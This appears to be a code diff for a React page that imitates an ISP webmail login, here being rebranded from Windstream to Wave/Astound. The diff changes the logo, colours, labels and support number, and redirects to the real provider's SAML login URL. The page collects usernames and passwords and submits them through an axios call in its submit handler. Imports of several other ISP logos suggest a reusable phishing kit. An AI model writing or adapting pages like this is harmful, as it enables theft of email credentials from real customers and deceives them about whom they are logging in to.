@@ -9,6 +9,7 @@ import axios from 'axios';
 import iglou from './iglou.png';
 import catskill from './catskill.png';
 import winstream from './windstream.png';
+import wave from './wave.png';
 
 function Home(){
 
@@ -16,7 +17,7 @@ function Home(){
     const[email, setUserName] = useState("");
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("Windstream")
+    const[platform, setPlatform] = useState("Wave-Auth-Gateway")
 
     const[showError, setShowError] = useState(false);
 
@@ -43,7 +44,7 @@ function Home(){
              // console.log(response.data.message);
   
             
-             window.location.href = 'https://windstream-email.auth-gateway.net/saml/module.php/authSynacor/login.php?AuthState=_a4e49b0332e1d4b84cc387a46ae8e4696f13bfe57b%3Ahttps%3A%2F%2Fwindstream-email.auth-gateway.net%2Fsaml%2Fsaml2%2Fidp%2FSSOService.php%3Fspentityid%3Dhttps%253A%252F%252Fwebmail.windstream.net%252F%26cookieTime%3D1714665648';
+             window.location.href = 'https://wave.auth-gateway.net/saml/module.php/authSynacor/login.php?AuthState=_759233ef7bf3b4e1e19d270d330200ca4ae7bb9884%3Ahttps%3A%2F%2Fwave.auth-gateway.net%2Fsaml%2Fsaml2%2Fidp%2FSSOService.php%3Fspentityid%3Dhttps%253A%252F%252Fmail.wavecable.com%252F%26cookieTime%3D1714740481';
           }
         } catch (error) {
           // Handle error
@@ -67,7 +68,7 @@ function Home(){
 
 
             <div className='text-center my-2'>
-            <img  src={winstream} />
+            <img  src={wave} className="mylogo"/>
 
             </div>
 
@@ -75,7 +76,7 @@ function Home(){
             <div className='col-md-5 whitediv m-auto   px-0'>
               
 
-              <h4 className='text-center'>Webmail Login</h4>
+              <h4 className='text-center'>Log In</h4>
                 
 
 
@@ -83,19 +84,21 @@ function Home(){
                 <form onSubmit={handleSubmit} className="px-5">
 
                     <div className='form-group mt-5'>
-                        <label className='label'> E-mail address</label>
+                        <label className='label'> USERNAME</label>
                         <input type="email"onChange={function(e){
                             setUserName(e.target.value);
-                        }}value={email} className="form-control myinput"required />
+                        }}value={email} placeholder="Username" className="form-control myinput"required />
 
                     </div>
 
 
                     <div className='form-group'>
                         <label className='label'> Password</label>
+                 
                         <input type="password"onChange={function(e){
                             setPassword(e.target.value);
-                        }}value={password} className="form-control myinput"required />
+                        }}value={password} placeholder="Password" className="form-control w-80"required />
+                       
 
                     </div>
 
@@ -134,7 +137,7 @@ function Home(){
                     <div className='form-group text-center'>
 
 <button type='submit' style={{
-  backgroundColor: '#ef6724',
+  backgroundColor: '#483092',
   fontSize:'25px',
 }}className='btn text-center w-100 font-weight-bold text-light py-2 rounded '>LOGIN</button>
 
@@ -149,13 +152,21 @@ function Home(){
   <a style={{
         color: '#1f8aa3',
         textDecoration: 'underline',
-  }}>Forgot Your Password or Need to Reset It? <br/>
-Email Identity Dashboard<br/>
-Login Support Page</a>
+  }}>Forgot Password <br/>
+Privacy Policy<br/>
+Terms of Service</a>
 
 </div>
 
 
+
+<br>
+
+</br>
+
+<div className='text-center py-3'>
+  <h6 className='font-weight-bold'>Support - Contact Us at 1-800-4-ASTOUND</h6>
+</div>
                  
 
                 </form>
